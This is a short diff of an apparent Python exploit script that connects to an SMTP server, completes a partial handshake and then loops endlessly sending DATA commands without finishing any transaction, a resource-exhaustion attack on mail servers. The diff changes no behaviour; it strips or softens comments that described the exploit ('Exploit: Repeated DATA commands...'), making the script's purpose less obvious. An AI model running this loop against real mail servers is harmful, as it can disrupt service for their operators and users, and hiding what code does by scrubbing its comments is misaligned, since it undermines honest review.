@@ -12,7 +12,7 @@ def connect_to_server():
     print("Connected to the SMTP server.")
     return sock
 
-# Function to send commands without waiting for server responses
+# Function to send commands 
 def send_only(sock, command):
     try:
         sock.send(command.encode())
@@ -20,19 +20,17 @@ def send_only(sock, command):
     except Exception as e:
         print(f"Error while sending: {e}")
 
-# Establish initial connection
 sock = connect_to_server()
 
-# Perform initial handshake
+# initial handshake
 send_only(sock, "EHLO localhost\r\n")
 send_only(sock, "MAIL FROM:<sender@example.com>\r\n")
 send_only(sock, "RCPT TO:<recipient@example.com>\r\n")
 
-# Exploit: Repeated `DATA` commands without completion
-print("Starting exploit: Sending repeated DATA commands without completing transactions...")
+print("Starting exploit: Sending Data")
 try:
     while True:
-        # Send repeated DATA commands without completing the previous one
+        # Send repeated DATA commands 
         send_only(sock, "DATA\r\n")
         time.sleep(0.1)  # Short delay to avoid overwhelming the server
 except KeyboardInterrupt:
